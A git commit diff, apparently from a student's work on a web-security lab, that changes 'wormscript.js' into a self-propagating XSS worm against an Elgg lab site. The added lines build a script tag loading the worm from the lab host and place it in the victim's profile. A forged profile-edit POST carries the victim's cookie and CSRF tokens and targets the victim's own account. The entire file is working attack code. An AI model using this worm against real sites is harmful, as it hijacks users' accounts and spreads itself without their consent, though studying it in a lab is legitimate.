047b9cdab5de4725af164d7b9992354bd63a5924
princelydmello <dmello.p@husky.neu.edu>
2016-06-02 17:59:24 -0400

    Update wormscript.js

--- CSRF_XSS/wormscript.js
+++ CSRF_XSS/wormscript.js
@@ -1,4 +1,5 @@
 var Ajax=null;
+var scripttext = escape("<script type=\"text/javascript\" src=\"http://www.xsslabelgg.com/wormscript1.js\"></script>");
 Ajax=new XMLHttpRequest();
 Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit HTTP/1.1",true);
 Ajax.setRequestHeader("Host","www.xsslabelgg.com");
@@ -11,6 +12,7 @@ Ajax.setRequestHeader("Cookie",document.cookie);
 Ajax.setRequestHeader("Connection","keep-alive");
 Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 Ajax.setRequestHeader("Content-Length","498");
-var content="__elgg_token="+elgg.security.token.__elgg_token+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&name=Alice&description=%3Cp%3EHi%3C%2Fp%3E&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=39";
+var content="__elgg_token="+elgg.security.token.__elgg_token+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&name=Alice&description="+scripttext+"&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid="+elgg.session.user.guid;
 Ajax.send(content);
+
 
